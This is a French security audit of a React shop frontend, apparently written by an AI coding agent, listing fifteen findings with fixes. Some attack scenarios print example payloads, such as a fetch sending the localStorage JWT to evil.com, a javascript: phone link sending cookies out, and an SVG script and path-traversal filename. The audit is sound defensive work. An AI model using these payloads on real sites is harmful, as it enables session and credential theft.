# Audit de Sécurité Frontend — MK BAZAAR V2

**Date :** 25 juin 2026
**Branche :** `V2`
**Périmètre :** Frontend React (`frontend/src`) — authentification, XSS, injections, API, uploads, autorisation, dépendances, configuration
**Méthode :** Analyse statique multi-angle (5 agents spécialisés en parallèle)

---

## Résumé Exécutif

L'audit a identifié **15 problèmes de sécurité** classés par gravité. Aucune vulnérabilité critique n'est présente. Les risques les plus importants sont concentrés sur trois axes : le stockage du JWT en `localStorage` (vecteur XSS), l'absence de validation côté client sur les uploads (taille, MIME), et des incohérences dans la logique de protection des routes admin.

Le backend est globalement bien sécurisé (middleware `auth:api` + `admin` bien appliqués, pas d'IDOR exposé, upload avatar validé côté serveur). Les failles sont toutes dans le frontend.

| Gravité | Nombre |
|---------|--------|
| 🔴 CRITIQUE | 0 |
| 🟠 HAUTE | 7 |
| 🟡 MOYENNE | 6 |
| 🔵 FAIBLE | 5 |
| ✅ Positifs notables | 7 |

---

## Tableau de Synthèse

| # | Gravité | Fichier | Ligne | Problème |
|---|---------|---------|-------|----------|
| S-01 | 🟠 HAUTE | `services/apiConfig.js` | 34–36 | Token JWT envoyé vers toute URL `https://` arbitraire |
| S-02 | 🟠 HAUTE | `services/auth.js` | 12, 31 | JWT stocké en `localStorage`, vulnérable au vol par XSS |
| S-03 | 🟠 HAUTE | `components/HeroSection.jsx` | 29 | Open redirect via `cta_link` non validé |
| S-04 | 🟠 HAUTE | `pages/Dashboard/OrdersPage.jsx` | 390, 474 | Injection `tel:` non sanitisée depuis données utilisateur |
| S-05 | 🟠 HAUTE | `components/ProtectedRoute.jsx` | 24 | Incohérence vérification admin avec `DashboardLayout` |
| S-06 | 🟠 HAUTE | `pages/Dashboard/ProductsPage.jsx` | 516 | Aucune limite de taille fichier côté client |
| S-07 | 🟠 HAUTE | `pages/Dashboard/ProductsPage.jsx` | 1236 | `accept="image/*"` accepte les SVG (XSS potentiel) |
| S-08 | 🟡 MOYENNE | `services/auth.js` | 16, 61, 88 | Objet utilisateur complet (PII) persisté en `localStorage` |
| S-09 | 🟡 MOYENNE | `App.jsx` | 54 | Route `/compte` non protégée par `ProtectedRoute` |
| S-10 | 🟡 MOYENNE | `services/auth.js` | 99–101 | Aucune vérification d'expiration du token (`exp`) |
| S-11 | 🟡 MOYENNE | `pages/ProductDetails.jsx` | 265–277 | Injection de formatage Markdown dans messages WhatsApp |
| S-12 | 🟡 MOYENNE | `pages/Dashboard/ProductsPage.jsx` | 618 | Noms de fichiers non sanitisés avant envoi au backend |
| S-13 | 🟡 MOYENNE | `config/env.js` | 29 | `resolveMediaUrl` accepte toute URL `http://` externe |
| S-14 | 🔵 FAIBLE | `services/apiConfig.js` | 81 | `console.error` expose des objets d'erreur bruts en production |
| S-15 | 🔵 FAIBLE | `pages/Auth/LoginPage.jsx` | 107 | Longueur minimale de mot de passe incohérente (6 vs 8 chars) |

---

## Findings Détaillés

---

### S-01 🟠 HAUTE — Token JWT envoyé vers toute URL `https://` arbitraire

**Fichier :** `frontend/src/services/apiConfig.js`, lignes 34–36

```js
const url = endpoint.startsWith('https')
    ? endpoint
    : `${API_URL}${endpoint}`;
// ... puis le header Authorization est attaché à TOUTES les requêtes
```

**Description :** Si `endpoint` commence par `https://`, l'URL est utilisée telle quelle sans vérifier qu'elle appartient au domaine de l'API. Le header `Authorization: Bearer <JWT>` est ensuite ajouté à la requête, quelle que soit la destination.

**Scénario d'attaque :** Un attaquant ayant compromis une configuration (ex. : carousel hero, liens CTA) peut y injecter une URL `https://evil.com/collect`. Tout appel passant par `fetchAPI` avec cette URL exfiltre le token JWT de l'administrateur vers le serveur attaquant.

**Correction :**
```js
const resolvedUrl = endpoint.startsWith('https') ? endpoint : `${API_URL}${endpoint}`;
const isExternalUrl = !resolvedUrl.startsWith(API_URL) && !resolvedUrl.startsWith(getApiOrigin());
const headers = isExternalUrl ? {} : getAuthHeaders(); // Ne pas envoyer le token vers des domaines externes
```

---

### S-02 🟠 HAUTE — JWT stocké en `localStorage`, vulnérable au vol par XSS

**Fichier :** `frontend/src/services/auth.js`, lignes 12 et 31

```js
localStorage.setItem('token', res.data.token);
localStorage.setItem('user', JSON.stringify(res.data.user));
```

**Description :** Le JWT d'authentification (y compris pour les admins) est stocké dans `localStorage`, accessible à tout JavaScript s'exécutant sur le domaine. `localStorage` ne peut pas être protégé côté serveur, contrairement aux cookies `HttpOnly`.

**Scénario d'attaque :** Une injection XSS — via une dépendance npm compromise, un champ mal filtré, ou une future CVE — exécute `fetch('https://evil.com/?t='+localStorage.getItem('token'))`. L'attaquant obtient un accès total à l'API, y compris admin, sans que la victime le sache.

**Correction :** Migrer vers des cookies `HttpOnly; Secure; SameSite=Strict`. Le backend émet le token dans un `Set-Cookie` au lieu de le retourner dans le corps JSON. Le frontend ne voit jamais le token, le navigateur l'envoie automatiquement.

> ⚠️ Nécessite une coordination avec le backend. C'est un chantier, mais c'est la correction définitive.

---

### S-03 🟠 HAUTE — Open Redirect via `cta_link` non validé

**Fichier :** `frontend/src/components/HeroSection.jsx`, ligne 29
**Fichier lié :** `frontend/src/pages/Dashboard/ConfigurationsPage.jsx`, ligne 319

```jsx
// HeroSection.jsx — aucune validation de l'URL
<Link to={d.cta_link}>{d.cta_text}</Link>

// ConfigurationsPage.jsx — saisie libre de l'admin
<input value={hero.cta_link} onChange={e => setHero(p => ({ ...p, cta_link: e.target.value }))} />
```

**Description :** Le champ `cta_link` est saisi librement dans la configuration, persisté en base, puis injecté sans validation dans `<Link to={...}>`. Une valeur comme `//evil.com` ou `javascript:alert(1)` est injectée dans le DOM public.

**Scénario d'attaque :** Compte admin compromis → `cta_link = "//attacker.com/phishing"` → tous les visiteurs cliquant sur le bouton héro sont redirigés vers un site de phishing imitant MK BAZAAR.

**Correction :**
```js
// Dans ConfigurationsPage, avant sauvegarde :
const isRelativeUrl = (url) => /^\/[^/]/.test(url);
if (!isRelativeUrl(hero.cta_link)) {
  return showError('Le lien CTA doit être une URL relative (ex: /products)');
}
```

---

### S-04 🟠 HAUTE — Injection de protocole `tel:` depuis données utilisateur non validées

**Fichier :** `frontend/src/pages/Dashboard/OrdersPage.jsx`, lignes 390 et 474
**Fichier :** `frontend/src/pages/Dashboard/DashboardHome.jsx`, ligne 281

```jsx
<a href={`tel:${cmd.customer_phone}`}>{cmd.customer_phone}</a>
```

**Description :** `customer_phone` est saisi par un client lors d'une commande (flux non authentifié), stocké en base sans filtrage front, puis injecté directement dans un attribut `href`. Un client malveillant peut soumettre une valeur comme `javascript:fetch(...)` ou un schéma custom (`intent://...`).

**Scénario d'attaque :** Commande soumise avec `customer_phone = "javascript:document.location='https://evil.com/'+document.cookie"`. Un admin clique sur le lien dans le dashboard. Selon le navigateur, cela peut exécuter du JavaScript ou ouvrir une application arbitraire via des protocoles custom (ex. `intent://` sur Android).

**Correction :**
```js
const sanitizePhone = (phone) => /^[\d\s+().-]{6,20}$/.test(phone ?? '') ? phone : null;
const safePhone = sanitizePhone(cmd.customer_phone);
{safePhone ? <a href={`tel:${safePhone}`}>{safePhone}</a> : <span>—</span>}
```

---

### S-05 🟠 HAUTE — Incohérence de vérification admin entre `ProtectedRoute` et `DashboardLayout`

**Fichier :** `frontend/src/components/ProtectedRoute.jsx`, ligne 24
**Fichier :** `frontend/src/components/DashboardLayout.jsx`, lignes 252–257

```js
// ProtectedRoute.jsx — vérifie user?.is_admin (propriété directe)
if (requireAdmin && !user?.is_admin) return <Navigate to="/" replace />;

// DashboardLayout.jsx — vérifie seulement l'existence de l'utilisateur, pas le rôle admin
if (!user) navigate("/login", { replace: true });

// AuthContext.jsx — calcule isAdmin avec 3 formats différents
const isAdmin = user?.is_admin === true || user?.role === 'admin' || user?.roles?.includes('admin');
```

**Description :** Deux problèmes conjoints : (1) `ProtectedRoute` vérifie `user?.is_admin` directement au lieu d'utiliser `isAdmin` du contexte — si le backend retourne `role: 'admin'` sans `is_admin: true`, un admin légitime est bloqué. (2) `DashboardLayout` n'applique aucune vérification de rôle — c'est une défense en profondeur manquante.

**Scénario d'attaque :** Un utilisateur authentifié mais non-admin modifie `localStorage` pour mettre `is_admin: true` dans l'objet `user`. `ProtectedRoute` le laisse passer. `DashboardLayout` ne re-vérifie pas. L'utilisateur accède aux pages financières et à la liste des utilisateurs. (Note : les appels API resteraient bloqués par le backend, mais l'interface est exposée.)

**Correction :**
```js
// ProtectedRoute.jsx
const { user, isAdmin } = useAuth();
if (requireAdmin && !isAdmin) return <Navigate to="/" replace />;

// DashboardLayout.jsx — ajouter une défense en profondeur
if (!isAdmin) return <Navigate to="/" replace />;
```

---

### S-06 🟠 HAUTE — Aucune limite de taille de fichier côté client

**Fichiers :** `ProductsPage.jsx` (l. 516–521), `AccountPage.jsx`, `CategoriesPage.jsx`, `appSettings.js`

```js
// ProductsPage.jsx — aucun contrôle de file.size
const handleDropFiles = useCallback((newFiles) => {
    const images = newFiles.filter((f) => f.type.startsWith("image/"));
    setSelectedFiles((prev) => [...prev, ...images]); // taille non vérifiée
```

**Description :** Aucun des composants d'upload ne vérifie `file.size` avant envoi. Un fichier de 500 Mo peut être sélectionné et envoyé sans avertissement, saturant la bande passante, la mémoire du navigateur et potentiellement le backend.

**Scénario d'attaque :** Un administrateur compromis ou malveillant uploade un fichier de plusieurs centaines de Mo, provoquant une saturation du serveur (DoS applicatif). Sur des connexions lentes, cela gèle l'interface admin.

**Correction :**
```js
const MAX_FILE_SIZE = 4 * 1024 * 1024; // 4 Mo
const handleDropFiles = useCallback((newFiles) => {
    const valid = newFiles.filter(f => {
        if (!f.type.startsWith("image/")) return false;
        if (f.size > MAX_FILE_SIZE) { setErrors(e => ({ ...e, images: `Fichier trop lourd (max 4 Mo) : ${f.name}` })); return false; }
        return true;
    });
    // ...
```

---

### S-07 🟠 HAUTE — `accept="image/*"` accepte les SVG (vecteur XSS potentiel)

**Fichier :** `frontend/src/pages/Dashboard/ProductsPage.jsx`, ligne 1236 (zone drag & drop)
**Fichier :** `frontend/src/pages/Dashboard/CategoriesPage.jsx`, ligne 152

```jsx
<input type="file" multiple accept="image/*" />
// Et côté filtre :
newFiles.filter((f) => f.type.startsWith("image/")) // accepte image/svg+xml
```

**Description :** `image/*` inclut `image/svg+xml`. Un fichier SVG peut contenir du JavaScript inline (`<script>alert(document.cookie)</script>`). Si le backend stocke et sert ce fichier sans `Content-Disposition: attachment`, il s'exécute dans le navigateur avec les permissions du domaine.

**Note :** Les inputs des variantes (l. 1099) et d'AccountPage utilisent déjà la liste blanche correcte. Seule la zone drag & drop principale et CategoriesPage sont affectées.

**Correction :**
```js
const ALLOWED_TYPES = ['image/jpeg', 'image/jpg', 'image/png', 'image/webp'];
// Dans l'input :
accept="image/jpeg,image/jpg,image/png,image/webp"
// Dans le filtre :
newFiles.filter(f => ALLOWED_TYPES.includes(f.type))
```

---

### S-08 🟡 MOYENNE — PII complet de l'utilisateur persisté en `localStorage`

**Fichier :** `frontend/src/services/auth.js`, lignes 16, 61, 74, 88

```js
localStorage.setItem('user', JSON.stringify(res.data.user)); // nom, email, téléphone, is_admin
```

**Description :** L'objet utilisateur complet (nom, email, téléphone, rôle) est sérialisé en `localStorage` et y persiste indéfiniment (même après fermeture de l'onglet). Ces données sont accessibles à tout script sur le domaine et survivent à la session.

**Scénario d'attaque :** Sur un poste partagé non déconnecté, un tiers peut récupérer les PII de l'utilisateur précédent via les DevTools. En cas de XSS, le profil complet (y compris le flag `is_admin`) est exfiltré avec le token.

**Correction :** Supprimer `localStorage.setItem('user', ...)`. Le profil est déjà chargé en mémoire via `AuthContext` (appel `/auth/me` au démarrage). La clé `localStorage.user` est redondante.

---

### S-09 🟡 MOYENNE — Route `/compte` protégée par `useEffect` seulement

**Fichier :** `frontend/src/App.jsx`, ligne 54
**Fichier :** `frontend/src/pages/Account/AccountPage.jsx`, lignes 698–700

```jsx
// App.jsx — pas de ProtectedRoute
<Route path="/compte" element={<AccountPage />} />

// AccountPage.jsx — protection par effet, après le rendu
useEffect(() => {
    if (!isLoading && !isAuthenticated) navigate("/login", { replace: true });
}, [isLoading, isAuthenticated, navigate]);
```

**Description :** Un `useEffect` s'exécute **après** le premier rendu. Entre le montage du composant et l'exécution de l'effet, des requêtes API peuvent partir (ex. `getMyOrders()` dans `OrdersTab`).

**Scénario d'attaque :** Un utilisateur non connecté navigue vers `/compte?tab=orders`. `OrdersTab` se monte et déclenche `getMyOrders()` avant que l'effet de redirection ne s'exécute. Une requête non authentifiée est émise (réponse 401 du backend, mais la requête a bien été envoyée).

**Correction :**
```jsx
// App.jsx — une ligne suffit
<Route path="/compte" element={<ProtectedRoute><AccountPage /></ProtectedRoute>} />
```

---

### S-10 🟡 MOYENNE — Aucune vérification d'expiration du token côté client

**Fichier :** `frontend/src/services/auth.js`, lignes 94–101

```js
export const isAuthenticated = () => !!localStorage.getItem('token');
// Vérifie uniquement la présence du token, pas son expiration (champ `exp`)
```

**Description :** Un token expiré côté serveur est traité comme valide côté client jusqu'à la prochaine requête API (retour 401). Il n'y a pas de déconnexion proactive ni de refresh token.

**Scénario d'attaque :** Utilisateur sur un ordinateur partagé, ferme l'onglet sans se déconnecter. Le token reste dans `localStorage`. Quiconque rouvre le navigateur semble connecté et peut consulter l'interface admin jusqu'au prochain call API échoué.

**Correction :**
```js
export const isAuthenticated = () => {
    const token = localStorage.getItem('token');
    if (!token) return false;
    try {
        const { exp } = JSON.parse(atob(token.split('.')[1]));
        return exp * 1000 > Date.now();
    } catch {
        return false;
    }
};
```

---

### S-11 🟡 MOYENNE — Injection de formatage Markdown dans les messages WhatsApp

**Fichier :** `frontend/src/pages/ProductDetails.jsx`, lignes 265–277
**Fichier :** `frontend/src/pages/BasketPage.jsx`, lignes 137–155

```js
const message = `👤 *Client :* ${resolvedName}\n`   // ← saisie utilisateur
              + `📍 *Adresse :* ${addressDetail}\n`  // ← saisie utilisateur
              + `📦 *Produit :* ${product.name}\n`;  // ← depuis BDD
```

**Description :** WhatsApp interprète `*texte*` comme **gras** et `_texte_` comme *italique*. Des données saisies librement par l'utilisateur sont insérées sans échappement dans le message. Un client malveillant peut injecter du formatage trompeur dans le message reçu par l'administrateur.

**Scénario d'attaque :** Client saisit comme nom : `*Commande ANNULÉE*\n*Remboursement requis : 50000 FCFA*`. Le message WhatsApp affiché à l'admin contient du texte en gras frauduleux, pouvant induire en erreur.

**Correction :**
```js
const escapeWA = (str) => String(str ?? '').replace(/[*_~`]/g, '\\$&');
const message = `👤 *Client :* ${escapeWA(resolvedName)}\n`
              + `📍 *Adresse :* ${escapeWA(addressDetail)}\n`;
```

---

### S-12 🟡 MOYENNE — Noms de fichiers non sanitisés avant envoi

**Fichier :** `frontend/src/pages/Dashboard/ProductsPage.jsx`, ligne 618

```js
selectedFiles.forEach((f) => fd.append("image_path[]", f));
// f.name peut être "../../etc/passwd.jpg" ou "<script>.png"
```

**Description :** Le nom original du fichier (`File.name`) est transmis tel quel dans le `FormData`. Des noms contenant des séquences de traversée de chemin (`../`) ou des caractères HTML/JS spéciaux sont envoyés au backend.

**Scénario :** Si le backend utilise le nom original pour le stockage ou l'affichage, cela peut mener à du path traversal ou du stockage XSS. Défense en profondeur même si le backend génère ses propres noms.

**Correction :**
```js
// Renommer le fichier avant envoi
const sanitizeName = (name) => name.replace(/[^a-zA-Z0-9._-]/g, '_').slice(0, 100);
const renamedFile = new File([f], sanitizeName(f.name), { type: f.type });
fd.append("image_path[]", renamedFile);
```

---

### S-13 🟡 MOYENNE — `resolveMediaUrl` accepte toute URL externe

**Fichier :** `frontend/src/config/env.js`, lignes 27–31

```js
export const resolveMediaUrl = (path) => {
    if (!path) return null;
    if (path.startsWith('http')) return path; // ← URL externe acceptée telle quelle
    return `${getApiOrigin()}${...}`;
};
```

**Description :** Si le backend retourne une valeur `avatar`, `image_path` ou `image_url` contenant une URL arbitraire (`http://evil.com/tracking.gif`, `javascript:`), elle est utilisée directement comme `src` d'image ou attribut `href`.

**Scénario :** Un produit dont l'image pointe vers `http://tracking-server.com/pixel.gif` envoie l'adresse IP de chaque administrateur consultant la liste des produits à un tiers.

**Correction :**
```js
export const resolveMediaUrl = (path) => {
    if (!path) return null;
    if (path.startsWith('http')) {
        const origin = getApiOrigin();
        return path.startsWith(origin) ? path : null; // Rejeter les URLs externes
    }
    return `${getApiOrigin()}${path.startsWith('/') ? path : `/${path}`}`;
};
```

---

### S-14 🔵 FAIBLE — `console.error` expose des objets d'erreur bruts en production

**Fichier :** `frontend/src/services/apiConfig.js`, ligne 81

```js
console.error('❌ API Error:', error); // stack trace et détails réseau visibles dans DevTools
```

**Description :** En production, toute personne ouvrant les DevTools voit les erreurs réseau détaillées (URLs d'endpoints, codes d'erreur, stack traces). Ne pas confondre avec une faille exploitable à distance — c'est une fuite d'information de surface.

**Correction :**
```js
if (import.meta.env.DEV) {
    console.error('❌ API Error:', error);
}
// En production, utiliser un service comme Sentry
```

---

### S-15 🔵 FAIBLE — Longueur minimale de mot de passe incohérente

**Fichier :** `frontend/src/pages/Auth/LoginPage.jsx`, ligne 107 → 6 caractères
**Fichier :** `frontend/src/pages/Auth/RegisterPage.jsx`, ligne 105 → 8 caractères

**Description :** La validation diffère entre la connexion (6 chars) et l'inscription (8 chars). Incohérence mineure qui peut signaler à un testeur qu'il existe des comptes avec des mots de passe de 6-7 caractères.

**Correction :** Supprimer la validation de longueur dans `LoginPage` (elle n'a de sens qu'à la création), ou harmoniser à 8 dans les deux formulaires.

---

## Points Positifs Notables

| ✅ | Détail |
|----|--------|
| Pas de `dangerouslySetInnerHTML` | Aucune occurrence dans tout le codebase — XSS DOM classique impossible |
| React échappe automatiquement les variables JSX | `{product.name}`, `{user.email}` etc. sont sûrs par construction |
| Backend bien sécurisé | Middleware `auth:api` + `admin` correctement appliqués sur toutes les routes sensibles |
| Pas d'IDOR exposé | Aucune route `GET /orders/{id}` publique, `myOrders` scoped sur le token |
| Upload avatar sécurisé côté serveur | Laravel valide le MIME réel (magic bytes), génère un UUID comme nom de fichier |
| Dépendances récentes | React 18, Router 6, Vite — aucune dépendance obsolète ou suspecte |
| `.env` dans `.gitignore` | Fichiers d'environnement non commités |

---

## Plan d'Action Priorisé

### 🔴 Immédiat (avant mise en production)

1. **S-06** — Ajouter une limite de taille fichier (`4 Mo max`) sur tous les composants d'upload
2. **S-07** — Restreindre `accept` à `image/jpeg,image/jpg,image/png,image/webp` partout (y compris la zone drag & drop)
3. **S-04** — Valider `customer_phone` avec regex avant de construire le lien `tel:`
4. **S-05** — Unifier la logique admin dans `ProtectedRoute` (utiliser `isAdmin` du contexte) et ajouter un garde dans `DashboardLayout`
5. **S-09** — Envelopper la route `/compte` dans un `<ProtectedRoute>` dans `App.jsx`

### 🟡 Court terme (1–2 sprints)

6. **S-03** — Valider que `cta_link` est une URL relative avant sauvegarde dans `ConfigurationsPage`
7. **S-01** — Ne pas envoyer le header `Authorization` vers des URLs externes dans `apiConfig.js`
8. **S-08** — Supprimer `localStorage.setItem('user', ...)` — utiliser uniquement l'état React
9. **S-11** — Échapper les caractères Markdown (`*`, `_`, `~`) dans les messages WhatsApp
10. **S-12** — Sanitiser les noms de fichiers avant envoi via `FormData`
11. **S-13** — Bloquer les URLs externes dans `resolveMediaUrl`

### 🔵 Maintenance (backlog)

12. **S-02** — Migrer le JWT vers des cookies `HttpOnly` (coordination backend requise)
13. **S-10** — Ajouter la vérification de `exp` dans `isAuthenticated()` et une déconnexion automatique
14. **S-14** — Conditionner les `console.error` à `import.meta.env.DEV`
15. **S-15** — Harmoniser la validation de longueur de mot de passe

### 🏗️ Recommandations Infrastructure

- **CSP :** Configurer un header `Content-Security-Policy` au niveau nginx/Apache pour limiter les sources de scripts
- **Source maps :** Ajouter explicitement `build: { sourcemap: false }` dans `vite.config.js`
- **HTTPS :** S'assurer que `VITE_API_URL` pointe vers `https://` en production (rejeter `http://` au démarrage)
- **Future route de suivi** (`GET /orders/track/{orderNumber}`) : si implémentée, exiger un second facteur (ex. derniers chiffres du téléphone) + throttling strict — les numéros `MK-XXXX-{timestamp}` ont une entropie limitée

---

*Audit réalisé par Claude Code — analyse statique multi-agents. Ce rapport couvre uniquement le frontend. Un audit du backend Laravel est recommandé en complément.*
